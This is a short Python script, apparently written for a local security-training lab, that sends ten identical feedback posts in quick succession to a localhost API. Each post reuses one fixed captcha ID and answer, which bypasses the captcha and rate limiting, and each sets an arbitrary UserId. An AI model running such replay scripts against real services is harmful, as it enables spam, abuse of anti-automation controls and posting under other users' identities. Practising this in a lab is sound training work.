import requests

target_url = "http://127.0.0.1:3000/api/Feedbacks/"

headers = {
    "Content-Type": "application/json",
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36",
}

payload = {
    # whatever your feedback contains
    "UserId":23,
    "captchaId": 2,
    "captcha": "20",
    "comment": "Pythons everywhere! (***tomer@abc)",
    "rating": 1
}

print("[*] Posting 10 Feedbacks rapidly...")

for i in range(10):
    response = requests.post(target_url, json=payload, headers=headers)
    
    if response.status_code == 201:
        print(f"[+] Request {i+1}: Success!")
    else:
        print(f"[-] Request {i+1}: Failed with status {response.status_code}")
        print(response.text)
